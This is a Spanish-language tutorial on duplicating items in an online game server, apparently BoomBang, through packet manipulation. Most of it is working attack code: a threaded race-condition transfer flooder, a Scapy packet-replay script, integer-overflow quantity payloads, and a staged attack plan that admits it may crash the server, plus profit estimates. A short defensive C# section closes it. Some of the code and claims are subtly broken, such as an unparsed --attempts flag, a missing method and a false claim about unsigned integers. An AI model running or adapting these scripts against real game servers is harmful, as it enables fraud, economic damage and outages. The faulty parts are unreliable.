# Manipulación de Paquetes para Duplicación de Objetos

**Nivel:** Junior-Intermedio
**Severidad:** 🟡 MEDIA
**Confirmación:** ⚠️ Teórico - Requiere testing (No confirmado en código)
**Impacto en Economía:** CRÍTICO si funciona - Duplicación = Inflación infinita

---

## 📌 ¿Qué es esta vulnerabilidad?

**Manipulación de Paquetes** significa modificar las comunicaciones entre tu cliente y el servidor para engañar al servidor y hacer cosas que normalmente no podrías, como duplicar objetos.

### Conceptos Base

**Paquete normal (transferencia de objeto):**
```
Cliente → Servidor: "Transfiere Item ID 42 de mi cuenta a Usuario123"
Servidor verifica:
  ¿Tengo el item? ✅
  ¿Existe Usuario123? ✅
  Transferir item
  Eliminar item de mi inventario
  Agregar item al inventario de Usuario123
```

**Packet manipulation (intento de duplicación):**
```
Enviar paquete DOS VECES muy rápido:

Paquete 1: "Transfiere Item 42 a Usuario123"
Paquete 2: "Transfiere Item 42 a Usuario456" (0.001s después)

Si el servidor NO tiene locks:
  Paquete 1 procesa: tengo_item=true → transferir
  Paquete 2 procesa: tengo_item=true → transferir (¡todavía!)

  Resultado: Item transferido 2 veces = DUPLICADO
```

---

## 💰 ¿Cómo afecta la economía del juego?

### Impacto si es Explotable

| Consecuencia | Impacto | Tiempo |
|--------------|---------|--------|
| **Duplicación ilimitada** | 🔴 CATASTRÓFICO | Colapso económico en horas |
| **Inflación descontrolada** | 🔴 CRÍTICO | Items pierden todo su valor |
| **P2W roto** | 🔴 CRÍTICO | Nadie compra con dinero real |
| **Ventaja competitiva injusta** | 🟠 ALTO | Algunos jugadores dominan todo |

### Escenario Real

```
Jugador descubre duplicación:
- Tiene 1 Espada Legendaria (value: 100,000 coins)
- La duplica 1000 veces en 10 minutos
- Vende 999 copias por 50,000 coins cada una
- Gana: 49,950,000 coins en 10 minutos

Economía destruida:
- Todos compran Espadas Legendarias baratas
- Nadie compra con dinero real
- Servidor pierde $10,000 USD/mes en ingresos
- Juego muere en semanas
```

---

## 🎯 Vectores de Ataque

### Vector 1: Race Condition en Transferencias

**Teoría:**
Si el servidor NO usa locks o transacciones atómicas, puedes enviar múltiples paquetes de transferencia antes de que el servidor actualice tu inventario.

**Requisitos:**
- Endpoint de transferencia de objetos
- Servidor sin locks/mutex
- Conexión rápida (baja latencia)

**Código de prueba:**

```python
#!/usr/bin/env python3
"""
Test de Race Condition para duplicación
"""

import socket
import struct
import json
import threading
import time

class DuplicationTester:
    def __init__(self, server_ip="127.0.0.1", server_port=7200):
        self.server_ip = server_ip
        self.server_port = server_port

    def send_transfer(self, item_id, target_user, thread_id):
        """Enviar paquete de transferencia"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.server_ip, self.server_port))

        # Autenticarse (usar tu sesión)
        # ...

        # Enviar transfer
        packet = {
            "opcode": 999,  # Opcode de transferencia (ajustar)
            "itemId": item_id,
            "targetUserId": target_user
        }

        payload = json.dumps(packet).encode('utf-8')
        sock.sendall(struct.pack('>I', len(payload)) + payload)

        # Recibir respuesta
        length_data = sock.recv(4)
        if length_data:
            length = struct.unpack('>I', length_data)[0]
            response = sock.recv(length)
            data = json.loads(response.decode('utf-8'))

            print(f"[Thread {thread_id}] Respuesta: {data.get('success')}")

            if data.get('success'):
                return True

        sock.close()
        return False

    def test_race_condition(self, item_id, target_user, attempts=10):
        """Test: Enviar múltiples transfers simultáneos"""
        print(f"\n[*] Testeando Race Condition")
        print(f"    Item ID: {item_id}")
        print(f"    Target: User {target_user}")
        print(f"    Intentos: {attempts}")
        print("-" * 60)

        threads = []
        results = []

        # Crear threads que enviarán simultáneamente
        for i in range(attempts):
            t = threading.Thread(
                target=lambda tid=i: results.append(
                    self.send_transfer(item_id, target_user, tid)
                )
            )
            threads.append(t)

        # Iniciar todos AL MISMO TIEMPO
        for t in threads:
            t.start()

        # Esperar a que terminen
        for t in threads:
            t.join()

        # Analizar resultados
        successful = sum(results)

        print("\n" + "=" * 60)
        print(f"Resultados:")
        print(f"  Paquetes enviados: {attempts}")
        print(f"  Transfers exitosos: {successful}")

        if successful > 1:
            print(f"\n🔥 VULNERABLE: Item duplicado {successful} veces!")
            print(f"  Duplicaciones: {successful - 1}")
        elif successful == 1:
            print(f"\n✅ SEGURO: Solo 1 transfer procesado (correcto)")
        else:
            print(f"\n⚠️  FALLÓ: Ningún transfer procesado")

        print("=" * 60)

        return successful > 1

if __name__ == '__main__':
    print("=" * 60)
    print("TEST DE DUPLICACIÓN - RACE CONDITION")
    print("=" * 60)

    tester = DuplicationTester(
        server_ip="127.0.0.1",  # Cambiar a tu servidor
        server_port=7200
    )

    # Test con diferentes parámetros
    item_to_test = 42  # ID del item a duplicar
    target_user = 9999  # Usuario destino (puede ser cuenta tuya secundaria)

    # Test 1: 10 intentos simultáneos
    tester.test_race_condition(item_to_test, target_user, 10)

    # Test 2: 50 intentos (más agresivo)
    # tester.test_race_condition(item_to_test, target_user, 50)

    # Test 3: 100 intentos (muy agresivo)
    # tester.test_race_condition(item_to_test, target_user, 100)
```

**Ejecutar:**
```bash
# En tu VPS o local
python3 duplication_tester.py

# Si ves:
# 🔥 VULNERABLE: Item duplicado 5 veces!
# → Entonces la duplicación FUNCIONA

# Si ves:
# ✅ SEGURO: Solo 1 transfer procesado
# → Servidor usa locks correctamente
```

### Vector 2: Packet Replay Attack

**Teoría:**
Capturar un paquete válido de "recibir item" y reenviarlo múltiples veces.

**Ejemplo:**
```
Situación normal:
  Compras item en tienda
  Cliente → Servidor: {opcode: BUY_ITEM, itemId: 42}
  Servidor → Cliente: {success: true, item: {...}}

Packet replay:
  Capturas el paquete de respuesta del servidor
  Lo reenvías a tu cliente 100 veces
  Cliente procesa: "Recibí item" x100

Si el cliente NO valida con servidor:
  Inventario local se actualiza 100 veces
  Al sincronizar con servidor, puede quedar duplicado
```

**Herramienta: Wireshark + Scapy**

```python
#!/usr/bin/env python3
"""
Packet Replay para duplicación
"""

from scapy.all import *
import time

def capture_buy_packet(interface="lo0", port=7200, timeout=60):
    """Capturar paquete de compra"""
    print(f"[*] Capturando tráfico en {interface}:{port}")
    print("[*] Realiza una compra ahora...")

    packets = sniff(
        iface=interface,
        filter=f"tcp port {port}",
        timeout=timeout,
        count=100
    )

    print(f"[+] Capturados {len(packets)} paquetes")

    # Buscar paquete de respuesta BUY_ITEM
    for packet in packets:
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = bytes(packet[Raw].load)

            # Buscar patrón (ajustar según tu protocolo)
            if b'"success":true' in payload and b'"item"' in payload:
                print(f"[+] Paquete de compra encontrado!")
                print(f"    Payload: {payload[:100]}...")
                return packet

    print("[-] No se encontró paquete de compra")
    return None

def replay_packet(packet, times=10):
    """Reenviar paquete N veces"""
    if not packet:
        print("[-] No hay paquete para reenviar")
        return

    print(f"\n[*] Reenviando paquete {times} veces...")

    for i in range(times):
        send(packet, verbose=0)
        print(f"[+] Enviado {i+1}/{times}")
        time.sleep(0.01)  # Pequeño delay

    print(f"\n[✓] {times} paquetes enviados")
    print("[*] Verifica tu inventario para ver si se duplicó")

if __name__ == '__main__':
    print("=" * 60)
    print("PACKET REPLAY TEST")
    print("=" * 60)

    # Paso 1: Capturar paquete legítimo
    interface = "lo0"  # macOS: lo0, Linux: lo
    port = 7200

    packet = capture_buy_packet(interface, port)

    if packet:
        # Paso 2: Replay
        replay_packet(packet, times=50)
    else:
        print("\n[-] Test fallido - No se capturó paquete")
```

**Ejecutar:**
```bash
# IMPORTANTE: Requiere permisos de root
sudo python3 packet_replay.py

# Mientras corre:
# 1. Compra un item en el juego
# 2. El script lo captura
# 3. Lo reenvía 50 veces
# 4. Verifica si tu inventario tiene 50 copias del item
```

### Vector 3: Integer Overflow en Cantidad

**Teoría:**
Si el servidor usa enteros de 32 bits sin validar, puedes enviar un número negativo que se interprete como muy grande.

**Ejemplo:**
```python
# Transferir item con cantidad negativa
packet = {
    "opcode": TRANSFER_ITEM,
    "itemId": 42,
    "quantity": -1  # En unsigned int32: 4,294,967,295
}

# Si el servidor NO valida:
# Tu inventario: -1 (overflow a 4 billones)
# Resultado: Items infinitos
```

**Test:**
```python
def test_integer_overflow(item_id, quantities_to_test):
    """Testear overflow en cantidades"""

    test_quantities = [
        -1,              # Overflow a max uint32
        -2,
        -100,
        2147483648,      # Max int32 + 1
        4294967295,      # Max uint32
        0xFFFFFFFF,      # Max en hex
    ]

    for qty in test_quantities:
        print(f"\n[*] Testing quantity: {qty}")

        packet = {
            "opcode": ADD_ITEM,  # Ajustar
            "itemId": item_id,
            "quantity": qty
        }

        response = send_packet(packet)

        if response.get('success'):
            actual_qty = response.get('quantity', 0)
            print(f"[!] Servidor aceptó: {actual_qty} items")

            if actual_qty > 1000000:  # Sospechosamente alto
                print(f"🔥 VULNERABLE: Overflow detectado!")
                return True
        else:
            print(f"[✓] Servidor rechazó (correcto)")

    return False
```

---

## 🛠️ Configuración del Servidor (VPS)

### Instalación de Herramientas

```bash
# Conectar a VPS
ssh root@203.0.113.50

# Instalar dependencias
apt update
apt install -y python3 python3-pip tcpdump wireshark-common

# Instalar Scapy
pip3 install scapy

# Dar permisos para capturar paquetes
setcap cap_net_raw,cap_net_admin=eip /usr/bin/python3.10

# Verificar
python3 -c "from scapy.all import *; print('Scapy OK')"
```

### Configuración del Testing Environment

```bash
mkdir -p ~/boombang_duplication
cd ~/boombang_duplication

# Crear scripts
wget https://raw.githubusercontent.com/.../duplication_tester.py
wget https://raw.githubusercontent.com/.../packet_replay.py

chmod +x *.py

# O copiar los scripts de arriba manualmente
```

---

## 🎯 Ejecución del Ataque

### Metodología: De Menos a Más Agresivo

**Nivel 1: Test Básico (No invasivo)**

```bash
# Test con 2 paquetes simultáneos
python3 duplication_tester.py --attempts 2

# Si funciona → Vulnerable
# Si no funciona → Probar Nivel 2
```

**Nivel 2: Test Moderado**

```bash
# Test con 10 paquetes
python3 duplication_tester.py --attempts 10

# Monitorear servidor
tail -f /var/log/boombang/server.log
```

**Nivel 3: Test Agresivo (Puede crashear servidor)**

```bash
# Test con 100 paquetes
python3 duplication_tester.py --attempts 100

# ⚠️ Puede hacer que el servidor no responda
```

**Nivel 4: Packet Replay**

```bash
# Capturar y replay
sudo python3 packet_replay.py

# Mientras corre, compra un item
# El script lo captura y reenvía 50 veces
```

**Nivel 5: Integer Overflow**

```bash
# Test de overflow
python3 << 'EOF'
from duplication_tester import *

tester = DuplicationTester()
tester.test_integer_overflow(42, [-1, -100, 0xFFFFFFFF])
EOF
```

---

## 📊 Interpretar Resultados

### Escenario A: Duplicación Exitosa

```bash
python3 duplication_tester.py --attempts 10

# Output:
# [Thread 0] Respuesta: True
# [Thread 1] Respuesta: True  ← ¡Dos transfers exitosos!
# [Thread 2] Respuesta: True  ← ¡Tres!
# ...
#
# 🔥 VULNERABLE: Item duplicado 8 veces!
#   Duplicaciones: 7
```

**Qué hacer:**
1. ✅ Confirmado: Duplicación funciona
2. Documentar exactamente cómo reproducir
3. Calcular cuántas duplicaciones por minuto
4. Preparar reporte de impacto económico
5. **NO explotar masivamente** (solo para testing)

**Verificar:**
```bash
# En el juego, verificar inventario de cuentas involucradas

# Target user debe tener N copias del item
# Tu cuenta debe tener 0 copias (todas transferidas)

# Si ambos tienen copias → DUPLICADO ✅
```

### Escenario B: Servidor Seguro

```bash
# Output:
# [Thread 0] Respuesta: True
# [Thread 1] Respuesta: False  ← Rechazado
# [Thread 2] Respuesta: False  ← Rechazado
# ...
#
# ✅ SEGURO: Solo 1 transfer procesado (correcto)
```

**Explicación:**
```
Servidor usa locks correctamente:

Thread 1: LOCK → verificar item → transferir → UNLOCK
Thread 2: ESPERAR lock → verificar item (ya no está) → RECHAZAR
Thread 3: ESPERAR lock → verificar item (ya no está) → RECHAZAR
```

### Escenario C: Comportamiento Extraño

```bash
# Output:
# [Thread 0] Respuesta: True
# [Thread 1] Respuesta: True
# [Thread 2] Respuesta: Error
# ...
# [Thread 9] Respuesta: Timeout
```

**Posibles causas:**
1. Servidor se sobrecarga y crashea
2. Rate limiting activo (bloquea después de N peticiones)
3. Conexiones simultáneas limitadas
4. Bug en el servidor (no maneja concurrencia)

---

## 🔧 Troubleshooting

### Problema 1: "Permission denied" al capturar paquetes

**Síntomas:**
```bash
python3 packet_replay.py
# Scapy PermissionError: [Errno 1] Operation not permitted
```

**Soluciones:**

**A) Ejecutar con sudo**
```bash
sudo python3 packet_replay.py
```

**B) Dar permisos permanentes a Python**
```bash
# Linux
sudo setcap cap_net_raw,cap_net_admin=eip $(which python3)

# macOS
# No soporta setcap, DEBE usar sudo
```

**C) Usar Wireshark para capturar, Scapy para replay**
```bash
# Terminal 1: Capturar con Wireshark (GUI)
sudo wireshark

# Guardar captura como: buy_packet.pcap

# Terminal 2: Replay con Scapy
python3 << 'EOF'
from scapy.all import *

packets = rdpcap('buy_packet.pcap')
for i in range(50):
    sendp(packets[5], iface='lo0')  # Ajustar índice
EOF
```

### Problema 2: Race condition no funciona

**Síntomas:**
```bash
# Siempre muestra: ✅ SEGURO: Solo 1 transfer procesado
```

**Posibles razones:**

**A) Servidor usa locks/transacciones**
```
Esto es BUENO - significa el servidor está protegido
No hay duplicación posible por race condition
```

**B) Threads no se inician simultáneamente**
```python
# Mejorar sincronización:
import threading

barrier = threading.Barrier(10)  # Esperar a que 10 threads estén listos

def send_with_barrier(item_id, target, tid):
    barrier.wait()  # Todos esperan aquí
    # ↓ Se liberan AL MISMO TIEMPO
    return send_transfer(item_id, target, tid)
```

**C) Latencia de red demasiado alta**
```bash
# Verificar latency
ping 127.0.0.1
# Debe ser < 1ms para local

ping TU_VPS_IP
# Debe ser < 50ms para VPS

# Si > 100ms, race condition es muy difícil
# Solución: Ejecutar script EN el servidor VPS
```

### Problema 3: Servidor crashea durante test

**Síntomas:**
```bash
python3 duplication_tester.py --attempts 100

# Servidor se cuelga
# Conexiones se rechazan
```

**Solución:**

**A) Reducir agresividad**
```bash
# Usar menos threads
python3 duplication_tester.py --attempts 5

# Agregar delays
time.sleep(0.1)  # Entre cada thread
```

**B) Monitorear recursos del servidor**
```bash
# SSH a VPS
ssh root@VPS_IP

# Monitorear CPU/RAM en tiempo real
top

# Si CPU > 90% o RAM > 90%:
# El servidor no puede manejar la carga
# Usar menos threads o mejor hardware
```

**C) Revisar logs del servidor**
```bash
tail -f /var/log/boombang/error.log

# Buscar errores como:
# "Too many connections"
# "Out of memory"
# "Deadlock detected"
```

### Problema 4: Integer overflow no funciona

**Síntomas:**
```python
test_integer_overflow(42, [-1, 0xFFFFFFFF])

# Output:
# [✓] Servidor rechazó (correcto)  ← Todas rechazadas
```

**Razones:**

**A) Servidor valida input**
```csharp
// Código del servidor (ejemplo)
if (quantity < 0 || quantity > 1000) {
    return Error("Invalid quantity");
}
```

**B) Servidor usa tipos seguros**
```csharp
// En vez de int (puede ser negativo)
uint quantity;  // Unsigned, no puede ser negativo

// Si envías -1, se convierte a 0 automáticamente
```

**C) Deserialización segura**
```csharp
// JSON no permite números fuera de rango
int quantity = JsonConvert.DeserializeObject<int>(json);
// Si json tiene valor inválido, lanza excepción
```

### Problema 5: Packet replay no duplica

**Síntomas:**
```bash
sudo python3 packet_replay.py

# Paquetes enviados: 50/50
# Inventario: 1 item (no duplicado)
```

**Razones:**

**A) Servidor usa nonces/IDs únicos**
```json
// Cada paquete tiene ID único
{
    "opcode": BUY_ITEM,
    "packetId": "abc123xyz",  ← Cambia cada vez
    "timestamp": 1700000000
}

// Servidor rechaza IDs duplicados
```

**B) Servidor valida con base de datos**
```csharp
// Aunque reciba paquete 50 veces
// Servidor solo procesa si:
if (!alreadyProcessed(packetId)) {
    addItem();
}
```

**C) Cliente valida respuesta**
```actionscript
// Cliente espera respuesta del servidor
// Si no recibe respuesta, no actualiza inventario

// Replay de paquete sin pasar por servidor:
// Cliente no actualiza inventario
```

---

## ⚖️ Impacto Real en Economía

### Si la Duplicación Funciona

**Escenario: 1 jugador duplica durante 1 hora**

```
Item a duplicar: Espada Legendaria (value: 100,000 coins)

Método: Race condition con 10 threads
Éxito: 8 duplicaciones por intento
Delay: 5 segundos entre intentos (evitar detección)

Intentos por hora: 60 min * 60 sec / 5 sec = 720 intentos
Duplicaciones totales: 720 * 8 = 5,760 espadas

Valor generado: 5,760 * 100,000 = 576,000,000 coins
Equivalente en USD: ~$5,000 USD (si 1M coins = $10)

En 24 horas:
- 138,240 espadas duplicadas
- 13,824,000,000 coins generados
- ~$138,000 USD en valor

Impacto en economía:
- Espada Legendaria ya no es legendaria (hay miles)
- Precio de mercado colapsa (de 100k a 100 coins)
- Inflación masiva
- Jugadores legítimos pierden todo su progreso
- Juego muere en días
```

### Defensa

```csharp
// Código seguro (servidor)

private static readonly object _transferLock = new object();
private static HashSet<string> _processedPackets = new HashSet<string>();

public void TransferItem(Session session, int itemId, int targetUserId) {
    // Lock para prevenir race condition
    lock (_transferLock) {
        // Validar que el paquete no se ha procesado
        string packetId = GetPacketId(session, itemId, targetUserId);

        if (_processedPackets.Contains(packetId)) {
            return Error("Duplicate packet");
        }

        // Validar ownership
        if (!session.User.HasItem(itemId)) {
            return Error("Item not found");
        }

        // Transacción atómica
        using (var transaction = Database.BeginTransaction()) {
            try {
                // Remover de inventario origen
                session.User.RemoveItem(itemId);

                // Agregar a inventario destino
                targetUser.AddItem(itemId);

                // Commit
                transaction.Commit();

                // Marcar como procesado
                _processedPackets.Add(packetId);

                return Success();
            } catch {
                transaction.Rollback();
                return Error("Transfer failed");
            }
        }
    }
}
```

---

**Documento completo. Enfoque: Duplicación de objetos (teórico) con testing práctico.**
